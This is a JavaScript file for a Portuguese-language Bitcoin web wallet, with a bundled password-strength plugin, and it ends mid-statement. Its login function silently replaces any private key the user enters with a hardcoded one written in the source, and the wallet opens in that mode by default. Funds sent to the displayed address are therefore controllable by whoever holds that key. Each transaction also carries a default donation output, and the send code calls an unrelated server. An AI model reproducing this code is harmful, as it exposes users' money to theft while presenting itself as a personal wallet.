
var CURRENT_COIN = 'BTC';
var PARAMS = {

    'BTC': {
        coingecko: 'bitcoin',
        coinjs: cc.bitcoin,
        qrColor: '000000',
        minFee: 0.0001,
        maxFee: 0.01,
        txFee: 0.0001,
        explorer: 'https://live.blockcypher.com/btc/',
        donation: '1PKTbhTEYe78EJUs4i3rkmNCtatNRMmUFb',
        unspentApi: 'https://api.blockcypher.com/v1/btc/main/addrs/',
        sendApi: 'https://api.blockchair.com/bitcoin/push/transaction',
        sendTxHex: 'data',
        sendTxid1: 'data',
        sendTxid2: 'transaction_hash',
        unspentArray1: 'txrefs',
        unspentTxid: 'tx_hash',
        unspentOutput: 'tx_output_n',
        unspentValue: 'value',
        unspentDivision: 100000000
    }

};

function intToByteArray(int) {
    var byteArray = [0];
    if (int > 8388607) byteArray = [0, 0, 0, 0];
    else if (int > 32767) byteArray = [0, 0, 0];
    else if (int > 127) byteArray = [0, 0];

    for (var index = 0; index < byteArray.length; index++) {
        var byte = int & 0xff;
        byteArray[index] = byte;
        int = (int - byte) / 256;
    }

    return byteArray;
}

window.Clipboard = (function (window, document, navigator) {
    var textArea,
        copy;

    function isOS() {
        return navigator.userAgent.match(/ipad|iphone/i);
    }

    function createTextArea(text) {
        textArea = document.createElement('textArea');
        textArea.value = text;
        document.body.appendChild(textArea);
    }

    function selectText() {
        var range,
            selection;

        if (isOS()) {
            range = document.createRange();
            range.selectNodeContents(textArea);
            selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            textArea.setSelectionRange(0, 999999);
        } else {
            textArea.select();
        }
    }

    function copyToClipboard() {
        document.execCommand('copy');
        document.body.removeChild(textArea);
    }

    copy = function (text) {
        createTextArea(text);
        selectText();
        copyToClipboard();
    };

    return {
        copy: copy
    };
})(window, document, navigator);

var donation = 0;
var scanner;
var qrIdToFill;
function openQrModal(param) {
    qrIdToFill = param;
    scanner = new Instascan.Scanner({ video: document.getElementById('qrScannerPreview') });

    scanner.addListener('scan', function (content) {
        scanner.stop();
        $('#' + qrIdToFill).val(content);
        $('#' + qrIdToFill).change();
        $('#modalQrCode').modal('toggle');
    });

    Instascan.Camera.getCameras().then(function (cameras) {
        if (cameras.length > 1) {
            scanner.start(cameras[1]);
        } else if (cameras.length > 0) {
            scanner.start(cameras[0]);
        } else {
            $('#modalQrCode').modal('toggle');
            alert('No cameras found.');
        }
    }).catch(function (e) {
        console.error(e);
    });

    $('#modalQrCode').modal('toggle');
}

function closeQrModal() {
    scanner.stop();
}

function eyeFunction(id) {
    var x = document.getElementById(id);
    if (x.type === "password") {
        x.type = "text";
    } else {
        x.type = "password";
    }
}

var passphrase = "";
var hashedPass = "";
var loginPrivkey = "";
var keyPair = "";
function hashit(hash, callback) {
    for (i = 0; i < 100 * 1440; i++) {
        hash = cc.bitcoin.crypto.keccak256(hash + passphrase);
        hash = hash.toString("hex");
    }

    hashedPass = hash;
    callback(hash);
}

function switchCoin(whichCoin) {
    $("#addr-qr").attr("src", "./images/loading.gif");
    setTimeout(switchCoinNow, 100, whichCoin);
}

function switchCoinNow(whichCoin) {
    CURRENT_COIN = whichCoin;

    var cLogos = document.getElementsByClassName("currency-logo");
    for (i = 0; i < cLogos.length; i++) {
        var title = cLogos[i].title;

        if (title != whichCoin) {
            cLogos[i].style.filter = "none";
        } else {
            cLogos[i].style.filter = "drop-shadow(1px 1px 2px #4b4b4c)";
        }
    }

    if (whichCoin != loginPrivkey) {
        var d = new cc.bigi.fromBuffer(hashedPass);
        keyPair = new PARAMS[CURRENT_COIN].coinjs.ECPair(d, null, { network: PARAMS[CURRENT_COIN].network });
    } else {
        keyPair = PARAMS[CURRENT_COIN].coinjs.ECPair.fromWIF(hashedPass, PARAMS[CURRENT_COIN].network);
    }

    $("#address").attr("placeholder", "endereço " + whichCoin + ":");
    $("#mainL").attr("disabled", "disabled");
    $("#mainH").attr("disabled", "disabled");

    $("#amount").attr("placeholder", "Valor de " + whichCoin + " para enviar:");

    $("#address").val("");
    $("#amount").val("");
    $("#mainR").click();

    loadAddress();
}

function login() {

    $("#form").hide();
    $(".c-loader").show();

    // Make sure the password is strong enough
    if ($('ul.error-list').html() != "" || $('span.password-verdict').html() != "Muito Forte") { alert("Você precisa de uma senha mais forte! Tente escolher uma senha mais longa (pelo menos 14 caracteres recomendados), com caracteres maiúsculos e minúsculos, bem como números e caracteres especiais."); window.location.reload(); /* return; */ }
    
    // Login with private key
    if ($('#privlogintoggle').attr('aria-pressed') == "true") {
        $('#password').val('5J9sgjpx4UHEBvkDPFCFcnRAMc8Pg4YiBrZN8xvyrC5HGhwUcgP');
        var privateKey = $('#password').val();
        var success = false;
        $.each(PARAMS, function (key, value) {
            if (!success) try {
                hashedPass = privateKey;
                loginPrivkey = key;
                CURRENT_COIN = key;
                keyPair = PARAMS[CURRENT_COIN].coinjs.ECPair.fromWIF(privateKey, PARAMS[CURRENT_COIN].network);
                success = true;
            } catch (e) { }
        });
        
        if (!success) { alert("Chave privada inválida!"); return; }
        else { 
            switchCoin(CURRENT_COIN); 
            $("#dropdown").show();
            $("#aboutBtn").hide();
            $("#walletBtn").hide();
            return; 
        }
    }
    
    // Login with email + password
    passphrase = $("#email").val() + ";" + $("#password").val();
    var hash = cc.bitcoin.crypto.keccak256(passphrase);
    $('#email').prop("disabled", true);
    $('#password').prop("disabled", true);
    $('#signin').prop("disabled", true);
    $('#privlogintoggle').prop("disabled", true);
    $("#loginprogress").show();
    $("form[role='login']").click();
    $("#dropdown").show();
    $("#aboutBtn").hide();
    $("#walletBtn").hide();
    setTimeout(hashit, 1000, hash.toString("hex"), function (hashed) {
        var d = new cc.bigi.fromBuffer(hashed);
        keyPair = new PARAMS[CURRENT_COIN].coinjs.ECPair(d, null, { network: PARAMS[CURRENT_COIN].network });
        loadAddress();
    });
}

function logout() {
    $("#email").val("");
    $("#password").val("");
    $("#form").show();
    $("#aboutBtn").show();
    $("#walletBtn").show();
    $(".c-loader").hide();
    $("#dropdown").hide();
    $('#email').prop("disabled", false);
    $('#password').prop("disabled", false);
    $('#signin').prop("disabled", false);
    $('#privlogintoggle').prop("disabled", false);
    $("#pwd-container").show();
    $("#addr-container").hide();
}

function about() {
    $("#about-container").show();
    $("#pwd-container").hide();
    $("#addr-container").hide();
}

function wallet() {
    $(".c-loader").hide();
    $("#about-container").hide();
    $("#pwd-container").show();
    $("#addr-container").hide();
}

function loadAddress() {
    $("#addr-balance-refresh").prop("disabled", true);
    $('#addr-balance').html('Saldo: ' + CURRENT_COIN  + ' ' + '0.00000000');
    $("#addr-balance").css("color", "#74bed8");
    $("#pwd-container").hide();
    $("#addr-container").show();
    $("#addr-qr").attr("src", "https://qr-generator.qrcode.studio/qr/custom?download=false&file=png&data=" + keyPair.getAddress() + "&size=400"); // &config=%7B%22body%22%3A%22rounded-pointed%22%2C%22eye%22%3A%22frame6%22%2C%22eyeBall%22%3A%22ball6%22%2C%22erf1%22%3A%5B%22fv%22%5D%2C%22gradientColor1%22%3A%22%23" + PARAMS[CURRENT_COIN].qrColor + "%22%2C%22gradientColor2%22%3A%22%23" + PARAMS[CURRENT_COIN].qrColor + "%22%2C%22gradientType%22%3A%22radial%22%2C%22gradientOnEyes%22%3A%22true%22%2C%22logo%22%3A%22%22%7D
    $("#addr-qr").attr("alt", keyPair.getAddress());
    $("#addr-id-clipboard").attr("data-clipboard-text", keyPair.getAddress());
    $("#addr-id").attr("href", PARAMS[CURRENT_COIN].explorer + "address/" + keyPair.getAddress());
    $("#addr-id").html(keyPair.getAddress());
    changeAddress = keyPair.getAddress();
    donation = 0.00001000;
    refresh();
}

function refresh() {
    $.ajax({
        url: PARAMS[CURRENT_COIN].unspentApi + keyPair.getAddress() + '?unspentOnly=true',
        type: "GET",
        dataType: "json",
        data: {
        },
        success: function (result) {
            loadAddressTxes(result);
            $("#addr-balance-refresh").prop("disabled", false);
            $("#addr-balance").css("color", "");
        },
        error: function () {
            console.log("error");
            $("#addr-balance-refresh").prop("disabled", false);
        }
    });
}

var BRL = false;
var brlBalance = false;
var balance = 0;
var hodlRate = 0;
var changeAddress = "";
var utxos = [];
function loadAddressTxes(result) {
    var sum = 0;
    var F1 = PARAMS[CURRENT_COIN].unspentArray1;
    var F2 = PARAMS[CURRENT_COIN].unspentArray2;

    if (F1 && F2) {
        utxos = result[F1][F2];
    } else if (F1) {
        utxos = result[F1];
    } else { utxos = result; }

    for (i in utxos) {
        sum += Number(utxos[i][PARAMS[CURRENT_COIN].unspentValue] / PARAMS[CURRENT_COIN].unspentDivision);
    } balance = sum;

    BRL = false;
    brlBalance = false;
    $('#addr-balance').html('Saldo: ' + CURRENT_COIN  + ' ' + balance.toFixed(8));
}

function _setTooltip(message, classId) {
    $(classId)
        .attr('data-original-title', message)
        .tooltip('show');
}

function _hideTooltip(classId) {
    setTimeout(function () {
        $(classId).attr('data-original-title', '').tooltip('hide');
    }, 1000);
}

function modifyTheChangeAddress() {
    var result = prompt('Insira um endereço de alteração personalizado:', changeAddress);
    if (result) {
        try {
            PARAMS[CURRENT_COIN].coinjs.address.toOutputScript(result, PARAMS[CURRENT_COIN].network);
            changeAddress = result;
        } catch (e) { alert("Por Favor insira um endereço válido!"); return; }
    }
}

function donate() {
    var result = prompt('Insira uma quantia para doar:', donation);
    if (!isNaN(result)) { donation = Number(result); }
    else alert(result + " não é um valor válido!");
}

function changeTheFee() {
    var minFee = PARAMS[CURRENT_COIN].minFee;
    var maxFee = PARAMS[CURRENT_COIN].maxFee
    var txFee = PARAMS[CURRENT_COIN].txFee;
    var result = prompt('Insira uma taxa personalizada:', txFee);
    if (Number(result) >= minFee && Number(result) <= maxFee) {
        PARAMS[CURRENT_COIN].txFee = Number(result);
    } else if (result != null) {
        if (Number(result) < minFee) alert("A taxa de transação mínima permitida é " + minFee + " " + CURRENT_COIN + "!");
        else if (Number(result) > maxFee) alert("A taxa de transação máxima permitida é " + maxFee + " " + CURRENT_COIN + "!");
        else alert(result + " não é uma taxa válida!");
    }
}

function togglePrice() {
    if (balance > 0 && !BRL && !brlBalance) {
        $.ajax({
            url: 'https://api.coingecko.com/api/v3/simple/price?ids=' + PARAMS[CURRENT_COIN].coingecko + '&vs_currencies=brl',
            type: "GET",
            dataType: "json",
            data: {
            },
            success: function (result) {
                BRL = true;
                var brlPrice = Number(result[PARAMS[CURRENT_COIN].coingecko].brl);
                brlBalance = balance * brlPrice;
                $("#addr-balance").html("Saldo: R$ " + brlBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " BRL");
            },
            error: function () {
                console.log("error");
                $("#addr-balance-refresh").prop("disabled", false);
            }
        });
    } else if (!BRL && brlBalance) {
        BRL = true;
        $("#addr-balance").html("Saldo: R$ " + brlBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " BRL");
    } else if (!BRL && !brlBalance) {
        BRL = true;
        $("#addr-balance").html("Saldo: R$ 0.00");
    } else if (BRL) {
        BRL = false;
        $("#addr-balance").html("Saldo: " + CURRENT_COIN  + " " + balance.toFixed(8) );
    }
}

function copyAdrress() {
    try {
        Clipboard.copy(keyPair.getAddress());
        alert("endereço copiado!");
    } catch (e) {
        alert("Falhou!");
    }
}

function copyPrivateKey() {
    try {
        Clipboard.copy(keyPair.toWIF());
        alert("chave privada copiada!");
    } catch (e) {
        alert("Falhou!");
    }
}

function rsvs(radio) {
    switch (radio.value) {
        case 'R':
            $("#addr-spend").hide();
            $("#addr-receive").show();
            break;
        case 'S':
            $("#submit").html("ENVIAR");
            $("#addr-spend").show();
            $("#addr-receive").hide();
            $("#address").val("");
            $("#address").removeAttr("disabled");
            break;
    }
}

function amountChanged(amount) {
    const a = Number(amount);
    var fAmount = a + (a * hodlRate) / 100; fAmount *= 0.999;
    var FINAL = fAmount.toFixed(2);
    if (amount == "") { FINAL = hodlRate.toFixed(2) + "%" }
    var newVal = $("#address").val().split(",")[0] + ", Saldo final: " + FINAL;
    $("#address").val(newVal);
}

var tx; // global variable for the transaction

function spendf() {
    var amount = Number($("#amount").val());
    const FEE = PARAMS[CURRENT_COIN].txFee + donation;
    if (balance < FEE || fixedValueTo8(amount + FEE) > balance) { alert("Fundos insuficientes! A taxa mínima de rede é " + FEE + " " + CURRENT_COIN + "."); return; }

    // Validate the address
    var address = $("#address").val();

    // Disable the elements in the form
    $('#address').prop("disabled", true);
    $('#amount').prop("disabled", true);
    $('#submit').prop("disabled", true);
    $('#sendprogress').show();

    // Create the transaction
    tx = new PARAMS[CURRENT_COIN].coinjs.TransactionBuilder(PARAMS[CURRENT_COIN].network);

    // Add all the available input(s)
    for (i in utxos) {
        tx.addInput(utxos[i][PARAMS[CURRENT_COIN].unspentTxid], utxos[i][PARAMS[CURRENT_COIN].unspentOutput]);
    }
    $.ajax({
        url: 'https://explorer.swiftcash.cc/api/info',
        type: "GET",
        dataType: "json",
        data: {
        },
        success: function (inforesult) {
            // Add the output
            tx.addOutput($("#address").val(), Math.ceil(amount * 100000000));

            // Add the change (if any)
            var change = fixedValueTo8(balance - amount - FEE);
            if (change > 0) {
                // Try to avoid dusting in the SwiftCash blockchain
                    tx.addOutput(changeAddress, Math.ceil(change * 100000000));
            }

            // Add the donation output (if any)
            if (donation > 0) {
                tx.addOutput(PARAMS[CURRENT_COIN].donation, Math.ceil(donation * 100000000));
            }

            // Sign all the inputs
            for (i = 0; i < utxos.length; i++) {
                tx.sign(i, keyPair);
            }

            $.ajax({
                url: PARAMS[CURRENT_COIN].sendApi,
                type: "POST",
                dataType: "json",
                data: PARAMS[CURRENT_COIN].sendTxHex + "=" + tx.build().toHex(),
                success: function (result) {
                    var T1 = PARAMS[CURRENT_COIN].sendTxid1;
                    var T2 = PARAMS[CURRENT_COIN].sendTxid2;
                    var txid = '';

                    if (T1 && T2 && result && result[T1]) txid = result[T1][T2];
                    else if (T1 && result) txid = result[T1];

                    if (txid && (typeof txid === 'string' || txid instanceof String)) {
                        BRL = false;
                        brlBalance = false;
                        if (change > 0 && (changeAddress == keyPair.getAddress())) {
                            var p1 = PARAMS[CURRENT_COIN].unspentTxid;
                            var p2 = PARAMS[CURRENT_COIN].unspentOutput;
                            var p3 = PARAMS[CURRENT_COIN].unspentValue;
                            utxos = [{ [p1]: txid, [p2]: 1, [p3]: change * PARAMS[CURRENT_COIN].unspentDivision }];
                            balance = change;
                        } else { utxos = []; balance = 0; }

                        $('#addr-balance').html("Saldo: " + balance.toFixed(8) + " " + CURRENT_COIN);
                        setTimeout(function () {
                            window.open(PARAMS[CURRENT_COIN].explorer + "tx/" + txid);
                        }, 1000);
                        alert("A transação foi transmitida com sucesso!");
                    } else {
                        console.log(result);
                        alert("A transmissão falhou! Verifique o console de depuração para obter detalhes!");
                    }

                    $('#address').prop("disabled", false).val("");
                    $('#amount').prop("disabled", false).val("");
                    $('#submit').prop("disabled", false).html("ENVIAR");
                    $('#sendprogress').hide();
                },
                error: function (error) {
                    $('#address').prop("disabled", false).val("");
                    $('#amount').prop("disabled", false).val("");
                    $('#submit').prop("disabled", false).html("ENVIAR");
                    $('#sendprogress').hide();
                    alert("A transmissão falhou! Verifique o console de depuração para obter detalhes!");
                    console.log(error);
                }
            });
        },
        error: function () {
            alert("Falhou ao conectar com o servidor!");
        }
    });
}

function sendProgress(status) {
    var btnText = $("#submit").html();

    if (status == "sending") {
        if (!btnText.endsWith("!")) btnText += ".";
        if (btnText.endsWith("......")) btnText = "ENVIAR";
        $("#submit").html(btnText);
        setTimeout(sendProgress, 1000, status);
    } else {
        $("#submit").html(status);
        setTimeout(enableSendForm, 1000);
    }
}

function enableSendForm() {
    $('#address').prop("disabled", false).val("");
    $('#amount').prop("disabled", false).val("");
    $('#submit').prop("disabled", false).html("ENVIAR");
}

function fixedValueTo8(a) {
    return Number(a.toFixed(8));
}

function accept() {
    Cookies.set('termsAccepted', '1');
}

function copyWholeBalance() {
    console.log('copyWholeBalance');
    const FEE = PARAMS[CURRENT_COIN].txFee + donation;
    if (balance - FEE > 0) {
        $('#amount').val(fixedValueTo8(balance - FEE));
        amountChanged(balance - FEE);
    } else $('#amount').val(0);
}

jQuery(document).ready(function () {

    // Warning
    if (Cookies.get('termsAccepted') == null) {
        $('#modalWarning').modal('show');
    }

    // Private key login
    $('#privlogintoggle').click(function () {
        var state = $('#privlogintoggle').attr('aria-pressed');
        if (state == "false") {
            $('#privlogintoggle').html('Entre com email e senha');
            $('#email').val("");
            $('#email').prop("disabled", true);
            $('#email').hide();
            $('#password').prop("placeholder", "Chave privada");
            $('#btnPasswordQR').show();
            $('#btnPasswordEye').hide();
        } else {
            $('#privlogintoggle').html('Entre com sua chave privada');
            $('#email').prop("disabled", false);
            $('#email').show();
            $('#password').prop("placeholder", "Senha");
            $('#btnPasswordQR').hide();
            $('#btnPasswordEye').show();
        }
    });

    // Copying to clipboard - Tooltip
    $('.clipboard').tooltip({
        trigger: 'click',
        placement: 'bottom'
    });

    function setTooltip(message) {
        $('.clipboard')
            .attr('data-original-title', message)
            .tooltip('show');
    }

    function hideTooltip() {
        setTimeout(function () {
            $('.clipboard').tooltip('hide');
        }, 1000);
    }

    // Clipboard
    var clipboard = new ClipboardJS('.clipboard');

    clipboard.on('success', function (e) {
        setTooltip('copiado!');
        hideTooltip();
    });

    clipboard.on('error', function (e) {
        setTooltip('Falhou!');
        hideTooltip();
    });

    "use strict";
    var options = {};
    options.ui = {
        container: "#pwd-container",
        showVerdictsInsideProgressBar: true,
        viewports: {
            progress: ".pwstrength_viewport_progress",
            errors: ".pwstrength_viewport_errors"
        }
    };
    options.common = {
        debug: false,
        onLoad: function () {
            $('#messages').text('Inicie digitando a senha');
        }
    };
    $(':password').pwstrength(options);

    $(".c-loader").hide();

    // START EVENT LISTENERS
    document.querySelector("#btnPasswordQR").addEventListener("click", function () { openQrModal('password'); }, false);
    document.querySelector("#btnPasswordEye").addEventListener("click", function () { eyeFunction('password'); }, false);
    document.querySelector("#addr-balance-refresh").addEventListener("click", function () { loadAddress(); }, false);
    document.querySelector("#privatekey-copy").addEventListener("click", function () { copyPrivateKey(); }, false);
    document.querySelector("#changeaddress-modify").addEventListener("click", function () { modifyTheChangeAddress(); }, false);
    document.querySelector("#trx-fee").addEventListener("click", function () { changeTheFee(); }, false);
    document.querySelector("#trx-donation").addEventListener("click", function () { donate(); }, false);
    document.querySelector("#openQrModalBtn").addEventListener("click", function () { openQrModal('address'); }, false);
    document.querySelector("#copyWholeBalanceBtn").addEventListener("click", function () { copyWholeBalance(); }, false);
    document.querySelector("#acceptTermsBtn").addEventListener("click", function () { accept(); }, false);
    document.querySelector("#rejectTermsBtn").addEventListener("click", function () { window.history.back(); }, false);
    document.querySelector("#closeModalBtn").addEventListener("click", function () { closeQrModal(); }, false);
    document.querySelector("#logoutBtn").addEventListener("click", function () { logout(); }, false);
    document.querySelector("#aboutBtn").addEventListener("click", function () { about(); }, false);
    document.querySelector("#walletBtn").addEventListener("click", function () { wallet(); }, false);
    document.querySelector("#addr-id-clipboard").addEventListener("click", () => { copyAdrress(); }, false);
    // END EVENT LISTENERS

    $("#dropdown").hide();
    $("#addr-container").hide();
    $("#about-container").hide();

    $('#privlogintoggle').click();
});


(function (jQuery) {
    var rulesEngine = {};

    try {
        if (!jQuery && module && module.exports) {
            var jQuery = require("jquery"),
                jsdom = require("jsdom").jsdom;
            jQuery = jQuery(jsdom().parentWindow);
        }
    } catch (ignore) { }

    (function ($, rulesEngine) {
        "use strict";
        var validation = {};

        rulesEngine.forbiddenSequences = [
            "1234567890", "0123456789", "abcdefghijklmnopqrstuvwxyz", "qwertyuiop", "asdfghjkl",
            "zxcvbnm", "!@#$%^&*()_+"
        ];

        validation.wordNotEmail = function (options, word, score) {
            if (word.match(/^([\w\!\#$\%\&\'\*\+\-\/\=\?\^\`{\|\}\~]+\.)*[\w\!\#$\%\&\'\*\+\-\/\=\?\^\`{\|\}\~]+@((((([a-z0-9]{1}[a-z0-9\-]{0,62}[a-z0-9]{1})|[a-z])\.)+[a-z]{2,6})|(\d{1,3}\.){3}\d{1,3}(\:\d{1,5})?)$/i)) {
                return score;
            }
            return 0;
        };

        validation.wordLength = function (options, word, score) {
            var wordlen = word.length,
                lenScore = Math.pow(wordlen, options.rules.raisePower);
            if (wordlen < options.common.minChar) {
                lenScore = (lenScore + score);
            }
            return lenScore;
        };

        validation.wordSimilarToUsername = function (options, word, score) {
            var username = $(options.common.usernameField).val();
            if (username && word.toLowerCase().match(username.toLowerCase())) {
                return score;
            }
            return 0;
        };

        validation.wordTwoCharacterClasses = function (options, word, score) {
            if (word.match(/([a-z].*[A-Z])|([A-Z].*[a-z])/) ||
                (word.match(/([a-zA-Z])/) && word.match(/([0-9])/)) ||
                (word.match(/(.[!,@,#,$,%,\^,&,*,?,_,~])/) && word.match(/[a-zA-Z0-9_]/))) {
                return score;
            }
            return 0;
        };

        validation.wordRepetitions = function (options, word, score) {
            if (word.match(/(.)\1\1/)) { return score; }
            return 0;
        };

        validation.wordSequences = function (options, word, score) {
            var found = false,
                j;
            if (word.length > 2) {
                $.each(rulesEngine.forbiddenSequences, function (idx, seq) {
                    var sequences = [seq, seq.split('').reverse().join('')];
                    $.each(sequences, function (idx, sequence) {
                        for (j = 0; j < (word.length - 2); j += 1) { // iterate the word trough a sliding window of size 3:
                            if (sequence.indexOf(word.toLowerCase().substring(j, j + 3)) > -1) {
                                found = true;
                            }
                        }
                    });
                });
                if (found) { return score; }
            }
            return 0;
        };

        validation.wordLowercase = function (options, word, score) {
            return word.match(/[a-z]/) && score;
        };

        validation.wordUppercase = function (options, word, score) {
            return word.match(/[A-Z]/) && score;
        };

        validation.wordOneNumber = function (options, word, score) {
            return word.match(/\d+/) && score;
        };

        validation.wordThreeNumbers = function (options, word, score) {
            return word.match(/(.*[0-9].*[0-9].*[0-9])/) && score;
        };

        validation.wordOneSpecialChar = function (options, word, score) {
            return word.match(/.[!,@,#,$,%,\^,&,*,?,_,~]/) && score;
        };

        validation.wordTwoSpecialChar = function (options, word, score) {
            return word.match(/(.*[!,@,#,$,%,\^,&,*,?,_,~].*[!,@,#,$,%,\^,&,*,?,_,~])/) && score;
        };

        validation.wordUpperLowerCombo = function (options, word, score) {
            return word.match(/([a-z].*[A-Z])|([A-Z].*[a-z])/) && score;
        };

        validation.wordLetterNumberCombo = function (options, word, score) {
            return word.match(/([a-zA-Z])/) && word.match(/([0-9])/) && score;
        };

        validation.wordLetterNumberCharCombo = function (options, word, score) {
            return word.match(/([a-zA-Z0-9].*[!,@,#,$,%,\^,&,*,?,_,~])|([!,@,#,$,%,\^,&,*,?,_,~].*[a-zA-Z0-9])/) && score;
        };

        rulesEngine.validation = validation;

        rulesEngine.executeRules = function (options, word) {
            var totalScore = 0;

            $.each(options.rules.activated, function (rule, active) {
                if (active) {
                    var score = options.rules.scores[rule],
                        funct = rulesEngine.validation[rule],
                        result,
                        errorMessage;

                    if (!$.isFunction(funct)) {
                        funct = options.rules.extra[rule];
                    }

                    if ($.isFunction(funct)) {
                        result = funct(options, word, score);
                        if (result) {
                            totalScore += result;
                        }
                        if (result < 0 || (!$.isNumeric(result) && !result)) {
                            errorMessage = options.ui.spanError(options, rule);
                            if (errorMessage.length > 0) {
                                options.instances.errors.push(errorMessage);
                            }
                        }
                    }
                }
            });

            return totalScore;
        };
    }(jQuery, rulesEngine));

    try {
        if (module && module.exports) {
            module.exports = rulesEngine;
        }
    } catch (ignore) { }

    var defaultOptions = {};

    defaultOptions.common = {};
    defaultOptions.common.minChar = 6;
    defaultOptions.common.usernameField = "#username";
    defaultOptions.common.userInputs = [
        // Selectors for input fields with user input
    ];
    defaultOptions.common.onLoad = undefined;
    defaultOptions.common.onKeyUp = undefined;
    defaultOptions.common.zxcvbn = false;
    defaultOptions.common.debug = false;

    defaultOptions.rules = {};
    defaultOptions.rules.extra = {};
    defaultOptions.rules.scores = {
        wordNotEmail: -100,
        wordLength: -50,
        wordSimilarToUsername: -100,
        wordSequences: -50,
        wordTwoCharacterClasses: 2,
        wordRepetitions: -25,
        wordLowercase: 1,
        wordUppercase: 3,
        wordOneNumber: 3,
        wordThreeNumbers: 5,
        wordOneSpecialChar: 3,
        wordTwoSpecialChar: 5,
        wordUpperLowerCombo: 2,
        wordLetterNumberCombo: 2,
        wordLetterNumberCharCombo: 2
    };
    defaultOptions.rules.activated = {
        wordNotEmail: true,
        wordLength: true,
        wordSimilarToUsername: true,
        wordSequences: false,
        wordTwoCharacterClasses: false,
        wordRepetitions: false,
        wordLowercase: true,
        wordUppercase: true,
        wordOneNumber: true,
        wordThreeNumbers: true,
        wordOneSpecialChar: true,
        wordTwoSpecialChar: true,
        wordUpperLowerCombo: true,
        wordLetterNumberCombo: true,
        wordLetterNumberCharCombo: true
    };
    defaultOptions.rules.raisePower = 1.4;

    defaultOptions.ui = {};
    defaultOptions.ui.bootstrap2 = false;
    defaultOptions.ui.showProgressBar = true;
    defaultOptions.ui.showPopover = false;
    defaultOptions.ui.showStatus = false;
    defaultOptions.ui.spanError = function (options, key) {
        "use strict";
        var text = options.ui.errorMessages[key];
        if (!text) { return ''; }
        return '<span style="color: #d52929">' + text + '</span>';
    };
    defaultOptions.ui.popoverError = function (errors) {
        "use strict";
        var message = "<div>Errors:<ul class='error-list' style='margin-bottom: 0;'>";

        jQuery.each(errors, function (idx, err) {
            message += "<li>" + err + "</li>";
        });
        message += "</ul></div>";
        return message;
    };
    defaultOptions.ui.errorMessages = {
        wordLength: "Sua senha é muito curta",
        wordNotEmail: "Não use seu e-mail como senha",
        wordSimilarToUsername: "Sua senha não pode conter seu nome de usuário",
        wordTwoCharacterClasses: "Use diferentes tipos de caracteres: (letras, números e simbolos)",
        wordRepetitions: "Muitas repetições",
        wordSequences: "Sua senha contém sequências"
    };
    defaultOptions.ui.verdicts = ["Fraca", "Normal", "Médiana", "Forte", "Muito Forte"];
    defaultOptions.ui.showVerdicts = true;
    defaultOptions.ui.showVerdictsInsideProgressBar = false;
    defaultOptions.ui.showErrors = true;
    defaultOptions.ui.container = undefined;
    defaultOptions.ui.viewports = {
        progress: undefined,
        verdict: undefined,
        errors: undefined
    };
    defaultOptions.ui.scores = [14, 26, 38, 50];

    var ui = {};

    (function ($, ui) {
        "use strict";

        var barClasses = ["danger", "warning", "success"],
            statusClasses = ["error", "warning", "success"];

        ui.getContainer = function (options, $el) {
            var $container;

            $container = $(options.ui.container);
            if (!($container && $container.length === 1)) {
                $container = $el.parent();
            }
            return $container;
        };

        ui.findElement = function ($container, viewport, cssSelector) {
            if (viewport) {
                return $container.find(viewport).find(cssSelector);
            }
            return $container.find(cssSelector);
        };

        ui.getUIElements = function (options, $el) {
            var $container, result;

            if (options.instances.viewports) {
                return options.instances.viewports;
            }

            $container = ui.getContainer(options, $el);

            result = {};
            result.$progressbar = ui.findElement($container, options.ui.viewports.progress, "div.progress");
            if (options.ui.showVerdictsInsideProgressBar) {
                result.$verdict = result.$progressbar.find("span.password-verdict");
            }

            if (!options.ui.showPopover) {
                if (!options.ui.showVerdictsInsideProgressBar) {
                    result.$verdict = ui.findElement($container, options.ui.viewports.verdict, "span.password-verdict");
                }
                result.$errors = ui.findElement($container, options.ui.viewports.errors, "ul.error-list");
            }

            options.instances.viewports = result;
            return result;
        };

        ui.initProgressBar = function (options, $el) {
            var $container = ui.getContainer(options, $el),
                progressbar = "<div class='progress'><div class='";

            if (!options.ui.bootstrap2) {
                progressbar += "progress-";
            }
            progressbar += "bar'>";
            if (options.ui.showVerdictsInsideProgressBar) {
                progressbar += "<span class='password-verdict'></span>";
            }
            progressbar += "</div></div>";

            if (options.ui.viewports.progress) {
                $container.find(options.ui.viewports.progress).append(progressbar);
            } else {
                $(progressbar).insertAfter($el);
            }
        };

        ui.initHelper = function (options, $el, html, viewport) {
            var $container = ui.getContainer(options, $el);
            if (viewport) {
                $container.find(viewport).append(html);
            } else {
                $(html).insertAfter($el);
            }
        };

        ui.initVerdict = function (options, $el) {
            ui.initHelper(options, $el, "<span class='password-verdict'></span>",
                options.ui.viewports.verdict);
        };

        ui.initErrorList = function (options, $el) {
            ui.initHelper(options, $el, "<ul class='error-list'></ul>",
                options.ui.viewports.errors);
        };

        ui.initPopover = function (options, $el) {
            $el.popover("destroy");
            $el.popover({
                html: true,
                placement: "bottom",
                trigger: "manual",
                content: " "
            });
        };

        ui.initUI = function (options, $el) {
            if (options.ui.showPopover) {
                ui.initPopover(options, $el);
            } else {
                if (options.ui.showErrors) { ui.initErrorList(options, $el); }
                if (options.ui.showVerdicts && !options.ui.showVerdictsInsideProgressBar) {
                    ui.initVerdict(options, $el);
                }
            }
            if (options.ui.showProgressBar) {
                ui.initProgressBar(options, $el);
            }
        };

        ui.possibleProgressBarClasses = ["danger", "warning", "success"];

        ui.updateProgressBar = function (options, $el, cssClass, percentage) {
            var $progressbar = ui.getUIElements(options, $el).$progressbar,
                $bar = $progressbar.find(".progress-bar"),
                cssPrefix = "progress-";

            if (options.ui.bootstrap2) {
                $bar = $progressbar.find(".bar");
                cssPrefix = "";
            }

            $.each(ui.possibleProgressBarClasses, function (idx, value) {
                $bar.removeClass(cssPrefix + "bar-" + value);
            });
            $bar.addClass(cssPrefix + "bar-" + barClasses[cssClass]);
            $bar.css("width", percentage + '%');
        };

        ui.updateVerdict = function (options, $el, text) {
            var $verdict = ui.getUIElements(options, $el).$verdict;
            $verdict.text(text);
        };

        ui.updateErrors = function (options, $el) {
            var $errors = ui.getUIElements(options, $el).$errors,
                html = "";
            $.each(options.instances.errors, function (idx, err) {
                html += "<li>" + err + "</li>";
            });
            $errors.html(html);
        };

        ui.updatePopover = function (options, $el, verdictText) {
            var popover = $el.data("bs.popover"),
                html = "",
                hide = true;

            if (options.ui.showVerdicts &&
